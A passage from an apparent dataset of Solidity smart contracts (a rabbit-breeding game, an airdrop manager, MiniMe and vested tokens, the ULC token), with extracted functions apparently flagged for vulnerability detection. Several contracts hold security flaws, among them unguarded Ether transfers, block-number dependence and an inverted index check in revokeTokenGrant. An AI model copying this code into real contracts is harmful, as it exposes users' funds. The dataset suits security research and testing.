totalGen0++;\n setRabbitMother(_bunnyid, _matron);\n if (promo) {\n giffblock[_bunnyid] = true;\n }\n }\n function getGenomeChildren(uint32 _matron, uint32 _sire) internal view returns(uint) {\n uint genome;\n if (rabbits[(_matron-1)].genome >= rabbits[(_sire-1)].genome) {\n genome = rabbits[(_matron-1)].genome;\n } else {\n genome = rabbits[(_sire-1)].genome;\n }\n return genome.add(1);\n }\n function createChildren(uint32 _matron, uint32 _sire) public payable returns(uint32) {\n require(isPriv());\n require(isPauseSave());\n require(rabbitToOwner[_matron] == msg.sender);\n require(rabbits[(_sire-1)].role == 1);\n require(_matron != _sire);\n require(getBreed(_matron));\n require(msg.value >= getSirePrice(_sire));\n uint genome = getGenomeChildren(_matron, _sire);\n uint localdnk = privateContract.mixDNK(mapDNK[_matron], mapDNK[_sire], genome);\n Rabbit memory rabbit = Rabbit(_matron, _sire, block.number, 0, 0, 0, genome);\n uint32 bunnyid = uint32(rabbits.push(rabbit));\n mapDNK[bunnyid] = localdnk;\n uint _moneyMother = rabbitSirePrice[_sire].div(4);\n _transferMoneyMother(_matron, _moneyMother);\n rabbitToOwner[_sire].transfer(rabbitSirePrice[_sire]);\n uint system = rabbitSirePrice[_sire].div(100);\n system = system.mul(commission_system);\n ownerMoney.transfer(system);\n coolduwnUP(_matron);\n transferNewBunny(rabbitToOwner[_matron], bunnyid, localdnk, genome, _matron, _sire);\n setRabbitMother(bunnyid, _matron);\n return bunnyid;\n }\n function coolduwnUP(uint32 _mother) internal {\n require(isPauseSave());\n rabbits[(_mother-1)].birthCount = rabbits[(_mother-1)].birthCount.add(1);\n rabbits[(_mother-1)].birthLastTime = now;\n emit CoolduwnMother(_mother, rabbits[(_mother-1)].birthCount);\n }\n function _transferMoneyMother(uint32 _mother, uint _valueMoney) internal {\n require(isPauseSave());\n require(_valueMoney > 0);\n if (getRabbitMotherSumm(_mother) > 0) {\n uint pastMoney = _valueMoney/getRabbitMotherSumm(_mother);\n for (uint i=0; i < getRabbitMotherSumm(_mother); i++) {\n if (rabbitMother[_mother][i] != 0) {\n uint32 _parrentMother = rabbitMother[_mother][i];\n address add = rabbitToOwner[_parrentMother];\n setMotherCount(_parrentMother);\n totalSalaryBunny[_parrentMother] += pastMoney;\n emit SalaryBunny(_parrentMother, totalSalaryBunny[_parrentMother]);\n add.transfer(pastMoney);\n }\n }\n }\n }\n function setRabbitSirePrice(uint32 _rabbitid, uint price) public returns(bool) {\n require(isPauseSave());\n require(rabbitToOwner[_rabbitid] == msg.sender);\n require(price > bigPrice);\n uint lastTime;\n (lastTime,,) = getcoolduwn(_rabbitid);\n require(now >= lastTime);\n if (rabbits[(_rabbitid-1)].role == 1 && rabbitSirePrice[_rabbitid] == price) {\n return false;\n }\n rabbits[(_rabbitid-1)].role = 1;\n rabbitSirePrice[_rabbitid] = price;\n uint gen = rabbits[(_rabbitid-1)].genome;\n sireGenom[gen].push(_rabbitid);\n emit ChengeSex(_rabbitid, true, getSirePrice(_rabbitid));\n return true;\n }\n function setSireStop(uint32 _rabbitid) public returns(bool) {\n require(isPauseSave());\n require(rabbitToOwner[_rabbitid] == msg.sender);\n rabbits[(_rabbitid-1)].role = 0;\n rabbitSirePrice[_rabbitid] = 0;\n deleteSire(_rabbitid);\n return true;\n }\n function deleteSire(uint32 _tokenId) internal {\n uint gen = rabbits[(_tokenId-1)].genome;\n uint count = sireGenom[gen].length;\n for (uint i = 0; i < count; i++) {\n if(sireGenom[gen][i] == _tokenId)\n {\n delete sireGenom[gen][i];\n if(count > 0 && count != (i-1)){\n sireGenom[gen][i] = sireGenom[gen][(count-1)];\n delete sireGenom[gen][(count-1)];\n }\n sireGenom[gen].length--;\n emit ChengeSex(_tokenId, false, 0);\n return;\n }\n }\n }\n function getMoney(uint _value) public onlyOwner {\n require(address(this).balance >= _value);\n ownerMoney.transfer(_value);\n }\n}",
  "extract_feature": [
    "function transferNewBunny(address _to, uint32 _bunnyid, uint localdnk, uint breed, uint32 matron, uint32 sire) internal {\nemit NewBunny(_bunnyid, localdnk, block.number, breed);\nemit CreateChildren(matron, sire, _bunnyid);\naddTokenList(_to, _bunnyid);\ntotalSalaryBunny[_bunnyid] = 0;\nmotherCount[_bunnyid] = 0;\ntotalBunny++;\n}",
    "function createGennezise(uint32 _matron) public {\nbool promo = false;\nrequire(isPriv());\nrequire(isPauseSave());\nrequire(isPromoPause());\nif (totalGen0 > promoGen0) {\nrequire(msg.sender == ownerServer || msg.sender == ownerCEO);\n} else if (!(msg.sender == ownerServer || msg.sender == ownerCEO)) {\nrequire(!ownerGennezise[msg.sender]);\nownerGennezise[msg.sender] = true;\npromo = true;\n}\nuint localdnk = privateContract.getNewRabbit(msg.sender);\nRabbit memory _Rabbit = Rabbit( 0, 0, block.number, 0, 0, 0, 0);\nuint32 _bunnyid = uint32(rabbits.push(_Rabbit));\nmapDNK[_bunnyid] = localdnk;\ntransferNewBunny(msg.sender, _bunnyid, localdnk, 0, 0, 0);\nlastTimeGen0 = now;\nlastIdGen0 = _bunnyid;\ntotalGen0++;\nsetRabbitMother(_bunnyid, _matron);\nif (promo) {\ngiffblock[_bunnyid] = true;\n}\n}",
    "function createChildren(uint32 _matron, uint32 _sire) public payable returns(uint32) {\nrequire(isPriv());\nrequire(isPauseSave());\nrequire(rabbitToOwner[_matron] == msg.sender);\nrequire(rabbits[(_sire-1)].role == 1);\nrequire(_matron != _sire);\nrequire(getBreed(_matron));\nrequire(msg.value >= getSirePrice(_sire));\nuint genome = getGenomeChildren(_matron, _sire);\nuint localdnk = privateContract.mixDNK(mapDNK[_matron], mapDNK[_sire], genome);\nRabbit memory rabbit = Rabbit(_matron, _sire, block.number, 0, 0, 0, genome);\nuint32 bunnyid = uint32(rabbits.push(rabbit));\nmapDNK[bunnyid] = localdnk;\nuint _moneyMother = rabbitSirePrice[_sire].div(4);\n_transferMoneyMother(_matron, _moneyMother);\nrabbitToOwner[_sire].transfer(rabbitSirePrice[_sire]);\nuint system = rabbitSirePrice[_sire].div(100);\nsystem = system.mul(commission_system);\nownerMoney.transfer(system);\ncoolduwnUP(_matron);\ntransferNewBunny(rabbitToOwner[_matron], bunnyid, localdnk, genome, _matron, _sire);\nsetRabbitMother(bunnyid, _matron);\nreturn bunnyid;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b8b"
  },
  "filename": "436.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b8c"
  },
  "filename": "58.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Controlled {\n modifier onlyController { require(msg.sender == controller); _; }\n address public controller;\n function Controlled() public { controller = msg.sender;}\n function changeController(address _newController) public onlyController {\n controller = _newController;\n }\n}\ncontract TokenController {\n function proxyPayment(address _owner) public payable returns(bool);\n function onTransfer(address _from, address _to, uint _amount) public returns(bool);\n function onApprove(address _owner, address _spender, uint _amount) public\n returns(bool);\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint a, uint b) internal returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n function max64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal constant returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal constant returns (uint256) {\n return a < b ? a : b;\n }\n function assert(bool assertion) internal {\n require (assertion);\n }\n}\ncontract ERC20Basic {\n function totalSupply() constant returns (uint);\n function balanceOf(address who) constant returns (uint);\n function transfer(address to, uint value) returns (bool);\n event Transfer(address indexed from, address indexed to, uint value);\n}\ncontract ERC20 is ERC20Basic {\n mapping(address => uint) balances;\n function allowance(address owner, address spender) constant returns (uint);\n function transferFrom(address from, address to, uint value) returns (bool);\n function approve(address spender, uint value) returns (bool);\n function approveAndCall(address spender, uint256 value, bytes extraData) returns (bool);\n event Approval(address indexed owner, address indexed spender, uint value);\n function doTransfer(address _from, address _to, uint _amount) internal returns(bool);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public;\n}\ncontract MiniMeToken is Controlled {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'MMT_0.2';\n struct Checkpoint {\n uint128 fromBlock;\n uint128 value;\n }\n MiniMeToken public parentToken;\n uint public parentSnapShotBlock;\n uint public creationBlock;\n mapping (address => Checkpoint[]) balances;\n mapping (address => mapping (address => uint256)) allowed;\n Checkpoint[] totalSupplyHistory;\n bool public transfersEnabled;\n MiniMeTokenFactory public tokenFactory;\n function MiniMeToken(\n address _tokenFactory,\n address _parentToken,\n uint _parentSnapShotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public {\n tokenFactory = MiniMeTokenFactory(_tokenFactory);\n name = _tokenName;\n decimals = _decimalUnits;\n symbol = _tokenSymbol;\n parentToken = MiniMeToken(_parentToken);\n parentSnapShotBlock = _parentSnapShotBlock;\n transfersEnabled = _transfersEnabled;\n creationBlock = block.number;\n }\n function transfer(address _to, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n doTransfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _amount\n ) public returns (bool success) {\n if (msg.sender != controller) {\n require(transfersEnabled);\n require(allowed[_from][msg.sender] >= _amount);\n allowed[_from][msg.sender] -= _amount;\n }\n doTransfer(_from, _to, _amount);\n return true;\n }\n function doTransfer(address _from, address _to, uint _amount\n ) internal {\n if (_amount == 0) {\n Transfer(_from, _to, _amount);\n return;\n }\n require(parentSnapShotBlock < block.number);\n require((_to != 0) && (_to != address(this)));\n var previousBalanceFrom = balanceOfAt(_from, block.number);\n require(previousBalanceFrom >= _amount);\n if (isContract(controller)) {\n require(TokenController(controller).onTransfer(_from, _to, _amount));\n }\n updateValueAtNow(balances[_from], previousBalanceFrom - _amount);\n var previousBalanceTo = balanceOfAt(_to, block.number);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(balances[_to], previousBalanceTo + _amount);\n Transfer(_from, _to, _amount);\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balanceOfAt(_owner, block.number);\n }\n function approve(address _spender, uint256 _amount) public returns (bool success) {\n require(transfersEnabled);\n require((_amount == 0) || (allowed[msg.sender][_spender] == 0));\n if (isContract(controller)) {\n require(TokenController(controller).onApprove(msg.sender, _spender, _amount));\n }\n allowed[msg.sender][_spender] = _amount;\n Approval(msg.sender, _spender, _amount);\n return true;\n }\n function allowance(address _owner, address _spender\n ) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n function approveAndCall(address _spender, uint256 _amount, bytes _extraData\n ) public returns (bool success) {\n require(approve(_spender, _amount));\n ApproveAndCallFallBack(_spender).receiveApproval(\n msg.sender,\n _amount,\n this,\n _extraData\n );\n return true;\n }\n function totalSupply() public constant returns (uint) {\n return totalSupplyAt(block.number);\n }\n function balanceOfAt(address _owner, uint _blockNumber) public constant\n returns (uint) {\n if ((balances[_owner].length == 0)\n || (balances[_owner][0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(balances[_owner], _blockNumber);\n }\n }\n function totalSupplyAt(uint _blockNumber) public constant returns(uint) {\n if ((totalSupplyHistory.length == 0)\n || (totalSupplyHistory[0].fromBlock > _blockNumber)) {\n if (address(parentToken) != 0) {\n return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock));\n } else {\n return 0;\n }\n } else {\n return getValueAt(totalSupplyHistory, _blockNumber);\n }\n }\n function createCloneToken(\n string _cloneTokenName,\n uint8 _cloneDecimalUnits,\n string _cloneTokenSymbol,\n uint _snapshotBlock,\n bool _transfersEnabled\n ) public returns(address) {\n if (_snapshotBlock == 0) _snapshotBlock = block.number;\n MiniMeToken cloneToken = tokenFactory.createCloneToken(\n this,\n _snapshotBlock,\n _cloneTokenName,\n _cloneDecimalUnits,\n _cloneTokenSymbol,\n _transfersEnabled\n );\n cloneToken.changeController(msg.sender);\n NewCloneToken(address(cloneToken), _snapshotBlock);\n return address(cloneToken);\n }\n function generateTokens(address _owner, uint _amount\n ) public onlyController returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply + _amount >= curTotalSupply);\n uint previousBalanceTo = balanceOf(_owner);\n require(previousBalanceTo + _amount >= previousBalanceTo);\n updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount);\n updateValueAtNow(balances[_owner], previousBalanceTo + _amount);\n Transfer(0, _owner, _amount);\n return true;\n }\n function destroyTokens(address _owner, uint _amount\n ) onlyController public returns (bool) {\n uint curTotalSupply = totalSupply();\n require(curTotalSupply >= _amount);\n uint previousBalanceFrom = balanceOf(_owner);\n require(previousBalanceFrom >= _amount);\n updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount);\n updateValueAtNow(balances[_owner], previousBalanceFrom - _amount);\n Transfer(_owner, 0, _amount);\n return true;\n }\n function enableTransfers(bool _transfersEnabled) public onlyController {\n transfersEnabled = _transfersEnabled;\n }\n function getValueAt(Checkpoint[] storage checkpoints, uint _block\n ) constant internal returns (uint) {\n if (checkpoints.length == 0) return 0;\n if (_block >= checkpoints[checkpoints.length-1].fromBlock)\n return checkpoints[checkpoints.length-1].value;\n if (_block < checkpoints[0].fromBlock) return 0;\n uint min = 0;\n uint max = checkpoints.length-1;\n while (max > min) {\n uint mid = (max + min + 1)/ 2;\n if (checkpoints[mid].fromBlock<=_block) {\n min = mid;\n } else {\n max = mid-1;\n }\n }\n return checkpoints[min].value;\n }\n function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value\n ) internal {\n if ((checkpoints.length == 0)\n || (checkpoints[checkpoints.length -1].fromBlock < block.number)) {\n Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ];\n newCheckPoint.fromBlock = uint128(block.number);\n newCheckPoint.value = uint128(_value);\n } else {\n Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1];\n oldCheckPoint.value = uint128(_value);\n }\n }\n function isContract(address _addr) constant internal returns(bool) {\n uint size;\n if (_addr == 0) return false;\n assembly {\n size := extcodesize(_addr)\n }\n return size>0;\n }\n function min(uint a, uint b) pure internal returns (uint) {\n return a < b ? a : b;\n }\n function () public payable {\n require(isContract(controller));\n require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender));\n }\n function claimTokens(address _token) public onlyController {\n if (_token == 0x0) {\n controller.transfer(this.balance);\n return;\n }\n MiniMeToken token = MiniMeToken(_token);\n uint balance = token.balanceOf(this);\n token.transfer(controller, balance);\n ClaimedTokens(_token, controller, balance);\n }\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n event Transfer(address indexed _from, address indexed _to, uint256 _amount);\n event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock);\n event Approval(\n address indexed _owner,\n address indexed _spender,\n uint256 _amount\n );\n}\ncontract MiniMeTokenFactory {\n function createCloneToken(\n address _parentToken,\n uint _snapshotBlock,\n string _tokenName,\n uint8 _decimalUnits,\n string _tokenSymbol,\n bool _transfersEnabled\n ) public returns (MiniMeToken) {\n MiniMeToken newToken = new MiniMeToken(\n this,\n _parentToken,\n _snapshotBlock,\n _tokenName,\n _decimalUnits,\n _tokenSymbol,\n _transfersEnabled\n );\n newToken.changeController(msg.sender);\n return newToken;\n }\n}\ncontract LimitedTransferToken is ERC20 {\n modifier canTransfer(address _sender, uint _value) {\n require(_value < transferableTokens(_sender, uint64(now)));\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender, _value) returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from, _value) returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function transferableTokens(address holder, uint64 time) constant public returns (uint256) {\n return balanceOf(holder);\n }\n}\ncontract VestedToken is LimitedTransferToken, Controlled {\n using SafeMath for uint;\n uint256 MAX_GRANTS_PER_ADDRESS = 20;\n struct TokenGrant {\n address granter;\n uint256 value;\n uint64 cliff;\n uint64 vesting;\n uint64 start;\n bool revokable;\n bool burnsOnRevoke;\n }\n mapping (address => TokenGrant[]) public grants;\n event NewTokenGrant(address indexed from, address indexed to, uint256 value, uint256 grantId);\n function grantVestedTokens(\n address _to,\n uint256 _value,\n uint64 _start,\n uint64 _cliff,\n uint64 _vesting,\n bool _revokable,\n bool _burnsOnRevoke\n ) onlyController public {\n require(_cliff > _start && _vesting > _cliff);\n require(tokenGrantsCount(_to) < MAX_GRANTS_PER_ADDRESS);\n uint count = grants[_to].push(\n TokenGrant(\n _revokable ? msg.sender : 0,\n _value,\n _cliff,\n _vesting,\n _start,\n _revokable,\n _burnsOnRevoke\n )\n );\n transfer(_to, _value);\n NewTokenGrant(msg.sender, _to, _value, count - 1);\n }\n function revokeTokenGrant(address _holder, uint _grantId) public {\n TokenGrant storage grant = grants[_holder][_grantId];\n require(grant.revokable);\n require(grant.granter == msg.sender);\n require(_grantId >= grants[_holder].length);\n address receiver = grant.burnsOnRevoke ? 0xdead : msg.sender;\n uint256 nonVested = nonVestedTokens(grant, uint64(now));\n delete grants[_holder][_grantId];\n grants[_holder][_grantId] = grants[_holder][grants[_holder].length - 1];\n grants[_holder].length -= 1;\n doTransfer(_holder, receiver, nonVested);\n Transfer(_holder, receiver, nonVested);\n }\n function revokeAllTokenGrants(address _holder) {\n var grantsCount = tokenGrantsCount(_holder);\n for (uint i = 0; i < grantsCount; i++) {\n revokeTokenGrant(_holder, 0);\n }\n }\n function transferableTokens(address holder, uint64 time) constant public returns (uint256) {\n uint256 grantIndex = tokenGrantsCount(holder);\n if (grantIndex == 0) return balanceOf(holder);\n uint256 nonVested = 0;\n for (uint256 i = 0; i < grantIndex; i++) {\n nonVested = SafeMath.add(nonVested, nonVestedTokens(grants[holder][i], time));\n }\n uint256 vestedTransferable = SafeMath.sub(balanceOf(holder), nonVested);\n return SafeMath.min256(vestedTransferable, super.transferableTokens(holder, time));\n }\n function tokenGrantsCount(address _holder) constant returns (uint index) {\n return grants[_holder].length;\n }\n function calculateVestedTokens(\n uint256 tokens,\n uint256 time,\n uint256 start,\n uint256 cliff,\n uint256 vesting) constant returns (uint256)\n {\n if (time < cliff) return 0;\n if (time >= vesting) return tokens;\n uint256 vestedTokens = SafeMath.div(\n SafeMath.mul(\n tokens,\n SafeMath.sub(time, start)\n ),\n SafeMath.sub(vesting, start)\n );\n return vestedTokens;\n }\n function tokenGrant(address _holder, uint _grantId) constant returns (address granter, uint256 value, uint256 vested, uint64 start, uint64 cliff, uint64 vesting, bool revokable, bool burnsOnRevoke) {\n TokenGrant storage grant = grants[_holder][_grantId];\n granter = grant.granter;\n value = grant.value;\n start = grant.start;\n cliff = grant.cliff;\n vesting = grant.vesting;\n revokable = grant.revokable;\n burnsOnRevoke = grant.burnsOnRevoke;\n vested = vestedTokens(grant, uint64(now));\n }\n function vestedTokens(TokenGrant grant, uint64 time) private constant returns (uint256) {\n return calculateVestedTokens(\n grant.value,\n uint256(time),\n uint256(grant.start),\n uint256(grant.cliff),\n uint256(grant.vesting)\n );\n }\n function nonVestedTokens(TokenGrant grant, uint64 time) private constant returns (uint256) {\n return grant.value.sub(vestedTokens(grant, time));\n }\n function lastTokenIsTransferableDate(address holder) constant public returns (uint64 date) {\n date = uint64(now);\n uint256 grantIndex = grants[holder].length;\n for (uint256 i = 0; i < grantIndex; i++) {\n date = SafeMath.max64(grants[holder][i].vesting, date);\n }\n }\n}\ncontract AywakeToken is MiniMeToken {\n function AywakeToken (address _controller, address _tokenFactory)\n MiniMeToken(\n _tokenFactory,\n 0x0,\n 0,\n \"AywakeToken\",\n 18,\n \"AWK\",\n true\n )\n {\n changeController(_controller);\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b8d"
  },
  "filename": "584.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 ulc) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract ULCToken is StandardToken, SafeMath {\n string public constant name = \"ULCToken\";\n string public constant symbol = \"ULC\";\n uint256 public constant decimals = 8;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 3500;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function ULCToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(1000000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n 